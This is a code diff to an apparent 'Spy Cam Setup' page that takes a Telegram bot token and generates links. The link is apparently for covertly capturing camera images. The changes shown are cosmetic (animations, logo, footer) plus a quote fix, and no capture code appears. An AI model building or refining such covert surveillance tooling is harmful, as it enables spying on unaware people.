@@ -5,6 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Spy Cam Setup</title>
     <style>
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
         body {
             font-family: Arial, sans-serif;
             display: flex;
@@ -15,9 +25,18 @@
             background-color: #000;
             color: #fff;
             margin: 0;
+            animation: fadeIn 1s ease-in-out;
+        }
+        .logo {
+            position: absolute;
+            top: 20px;
+            width: 100px;
+            height: auto;
+            animation: slideIn 1s ease-in-out;
         }
         h1 {
             color: #fff;
+            animation: slideIn 1s ease-in-out;
         }
         form {
             background: #333;
@@ -26,6 +45,7 @@
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
             width: 90%;
             max-width: 400px;
+            animation: slideIn 1s ease-in-out;
         }
         label {
             display: block;
@@ -40,10 +60,11 @@
             border-radius: 4px;
             background: #444;
             color: #fff;
-            transition: border-color 0.3s ease;
+            transition: border-color 0.3s ease, background-color 0.3s ease;
         }
         input[type="text"]:focus {
             border-color: #007BFF;
+            background-color: #555;
             outline: none;
         }
         button {
@@ -72,9 +93,17 @@
         #linkContainer a:hover {
             background-color: #218838;
         }
+        .footer {
+            position: absolute;
+            bottom: 10px;
+            text-align: center;
+            width: 100%;
+            color: #777;
+        }
     </style>
 </head>
 <body>
+    <img src="logo.png" alt="Logo" class="logo">
     <h1>Spy Cam Setup</h1>
     <form id="botForm">
         <label for="botToken">Telegram Bot Token:</label>
@@ -86,6 +115,10 @@
         <button type="submit">Generate Link</button>
     </form>
     <p id="linkContainer"></p>
+    <div class="footer">
+        &copy; 2025 Spy Code . All rights reserved. | Subscribe for more updates.
+        &copy; https://www.youtube.com/@Spy_Code
+    </div>
 
     <script>
         document.getElementById('botForm').addEventListener('submit', function(event) {
@@ -116,10 +149,10 @@
                 if (response.ok) {
                     console.log("Link sent to Telegram");
                 } else {
-                    console.error("Error sending link to Telegram: `, response.statusText);
+                    console.error("Error sending link to Telegram: ", response.statusText);
                 }
             } catch (error) {
-                console.error(`Error sending link to Telegram: `, error);
+                console.error("Error sending link to Telegram: ", error);
             }
         }
     </script>
